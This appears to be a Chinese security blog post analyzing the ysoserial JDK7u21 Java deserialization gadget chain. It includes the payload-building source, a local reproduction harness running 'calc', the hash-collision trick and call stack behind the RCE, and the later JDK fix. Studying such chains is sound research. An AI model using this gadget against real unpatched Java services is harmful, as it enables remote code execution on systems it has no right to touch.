---
title: "Ysoserial JDK7u21"
date: 2020-06-10T11:13:52+08:00
draft: false
tags:
- ysoserial
- 反序列化
- Java
series:
-
categories:
- 代码审计
---

0^anything=anything
<!--more-->
## 环境
jdk7u21 ysoserial idea

## 复现
![image.png](https://y4er.com/img/uploads/20200610111235.png)

```java
package ysoserial.mytest;

import ysoserial.payloads.Jdk7u21;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;

public class JDK7u21 {
    public static void main(String[] args) {
        try {
            Object calc = new Jdk7u21().getObject("calc");

            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();//用于存放person对象序列化byte数组的输出流

            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(calc);//序列化对象
            objectOutputStream.flush();
            objectOutputStream.close();

            byte[] bytes = byteArrayOutputStream.toByteArray(); //读取序列化后的对象byte数组

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(bytes);//存放byte数组的输入流

            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            Object o = objectInputStream.readObject();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
## 分析
首先简单两行代码rce

```java
TemplatesImpl object = (TemplatesImpl) Gadgets.createTemplatesImpl("calc");
object.getOutputProperties();
```
![image.png](https://y4er.com/img/uploads/20200610115520.png)

createTemplatesImpl 是使用 javassist 动态的添加的恶意 java 代码，初始化时自动执行，之前的文章中说过，getOutputProperties()中调用newTransformer()
![image.png](https://y4er.com/img/uploads/20200610114926.png)

调用了getTransletInstance()
![image.png](https://y4er.com/img/uploads/20200610115760.png)

getTransletInstance()中将恶意字节码加载进来并且new实例，在实例化时rce。
![image.png](https://y4er.com/img/uploads/20200610110173.png)

现在的问题就是如何反序列化自动调用getOutputProperties，把yso的payload抠出来

```java
    public Object getObject(final String command) throws Exception {
        final Object templates = Gadgets.createTemplatesImpl(command);

        String zeroHashCodeStr = "f5a5a608";

        HashMap map = new HashMap();
        map.put(zeroHashCodeStr, "foo");

        InvocationHandler tempHandler = (InvocationHandler) Reflections.getFirstCtor(Gadgets.ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
        Reflections.setFieldValue(tempHandler, "type", Templates.class);
        Templates proxy = Gadgets.createProxy(tempHandler, Templates.class);

        LinkedHashSet set = new LinkedHashSet(); // maintain order
        set.add(templates);
        set.add(proxy);

        Reflections.setFieldValue(templates, "_auxClasses", null);
        Reflections.setFieldValue(templates, "_class", null);

        map.put(zeroHashCodeStr, templates); // swap in real object
        return set;
    }
```
map先是存了一个`f5a5a608=foo`，然后f5a5a608值改为TemplatesImpl恶意对象

set对象存放了TemplatesImpl恶意对象和Templates的动态代理对象

![image.png](https://y4er.com/img/uploads/20200610119092.png)

LinkedHashSet继承HashSet，其readObject在HashSet中
![image.png](https://y4er.com/img/uploads/20200610113776.png)

在该readObjcet中会将反序列化的对象put()放入map中（HashSet本质是HashMap），先添加templates再添加proxy。在put()第二次添加proxy的时候，map中已经有了一个TemplatesImpl
![image.png](https://y4er.com/img/uploads/20200610115905.png)
所以会拿上一个Entry的key做比较，当key对象相等时新值替换旧值，返回旧值。

```java
e.hash == hash && ((k = e.key) == key || key.equals(k))
```
问题就出在`key.equals(k)`，但是要想进入equals方法需要满足前面的几个短路条件

1. e.hash == hash 为真
2. (k = e.key) == key 为假

e.hash是在生成payload的时候`set.add(proxy)`计算的，贴一下堆栈

```java
hashCodeImpl:293, AnnotationInvocationHandler (sun.reflect.annotation)
invoke:64, AnnotationInvocationHandler (sun.reflect.annotation)
hashCode:-1, $Proxy0 (com.sun.proxy)
hash:351, HashMap (java.util)
put:471, HashMap (java.util)
add:217, HashSet (java.util)
getObject:84, Jdk7u21 (ysoserial.payloads)
rce:21, JDK7u21 (ysoserial.mytest)
main:16, JDK7u21 (ysoserial.mytest)
```

在java.util.HashMap#put添加键值的时候会计算对象hash，走了一个hash(key)函数
![image.png](https://y4er.com/img/uploads/20200610110429.png)

而key此时是proxy动态代理对象，要调用它的hashCode()函数需要走动态代理的invoke接口，当调用方法名为hashCode时，会进入hashCodeImpl()
![image.png](https://y4er.com/img/uploads/20200610117633.png)

```java
    private int hashCodeImpl() {
        int var1 = 0;

        Entry var3;
        for(Iterator var2 = this.memberValues.entrySet().iterator(); var2.hasNext(); var1 += 127 * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) {
            var3 = (Entry)var2.next();
        }

        return var1;
    }
```
这个方法遍历memberValues这个map对象，然后做了

```java
v += 127 * (key).hashCode() ^ memberValueHashCode(value);
```
`memberValueHashCode()`直接返回`var0.hashCode()`，也就是直接返回原本对象的hashcode，但是还要走一次亦或，所以要让`127 * (key).hashCode()=0`，而key为`f5a5a608`，他的hashcode刚好为0，到这里不得不惊叹作者的巧妙。

> 拓展: 空字符串和`\u0000`的hashCode都为0

![image.png](https://y4er.com/img/uploads/20200610119892.png)

e.hash==hash其实就是拿proxy代理的`@javax.xml.transform.Templates(f5a5a608=foo)`对象的hash和之前计算的自身hash做比较，结果当然为true。

`(k = e.key) == key`拿proxy对象和Templates比较肯定为false。

走到key.equals(k)这一步，也就是`proxy.equals(templates)`。同理调用proxy的equals函数需要通过invoke接口走
![image.png](https://y4er.com/img/uploads/20200610113803.png)

然后
![image.png](https://y4er.com/img/uploads/20200610113821.png)

getMemberMethods()取出两个无参方法
![image.png](https://y4er.com/img/uploads/20200610114904.png)

在这调用了getOutputProperties()，回到上文的rce流程就串起来了。

## 修复
```java
    AnnotationInvocationHandler(Class<? extends Annotation> var1, Map<String, Object> var2) {
        Class[] var3 = var1.getInterfaces();
        if (var1.isAnnotation() && var3.length == 1 && var3[0] == Annotation.class) {
            this.type = var1;
            this.memberValues = var2;
        } else {
            throw new AnnotationFormatError("Attempt to create proxy for a non-annotation type.");
        }
    }
```
对于this.type进行了校验必须为Annotation.class

## 参考
1. https://mp.weixin.qq.com/s/qlg3IzyIc79GABSSUyt-OQ
2. https://b1ue.cn/archives/176.html
3. https://xz.aliyun.com/t/6884
4. https://b1ngz.github.io/java-deserialization-jdk7u21-gadget-note/


**文笔垃圾，措辞轻浮，内容浅显，操作生疏。不足之处欢迎大师傅们指点和纠正，感激不尽。**